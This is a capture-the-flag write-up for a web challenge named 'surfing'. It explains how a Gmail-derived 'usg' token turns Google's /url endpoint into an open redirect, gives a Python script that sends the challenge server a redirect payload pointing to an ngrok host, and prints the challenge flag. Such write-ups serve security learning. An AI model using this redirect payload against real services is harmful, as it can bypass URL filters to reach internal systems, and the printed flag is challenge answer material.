https://ctftime.org/event/2423

# surfing (web)

Google redirects

## Solution

Very interesting challenge, basically you send an email on gmail to yourself to get the usg parameter.
Then you can use google as a open-redirect.
`#` at the end is needed for some reason.

```python
import requests
from urllib.parse import quote_plus, quote

part2 = "https://ca14-2804-1b3-8146-8451-d3ef-cb85-2b79-23d7.ngrok-free.app&source=gmail&ust=1722697936722000&usg=AOvVaw3Djb1BbeFhNoc5_At0Cbfe#"
part2 = quote_plus(part2)
payload = "http://google.com/url?q=" + part2

burp0_url = "http://challs.tfcctf.com:31595/get"

res = requests.get(burp0_url, params=f'url={payload}', proxies={
    'http': 'http://0.0.0.0:8080',
    'https': 'https://0.0.0.0:8080'
})
print(f"DEBUGPRINT[1]: go.py:6: res.text={res.text}")


```

## Flag
`TFCCTF{18fd102247cb73e9f9acaa42801ad03cf622ca1c3689e4969affcb128769d0bc}`

shafouz 2024/08/03
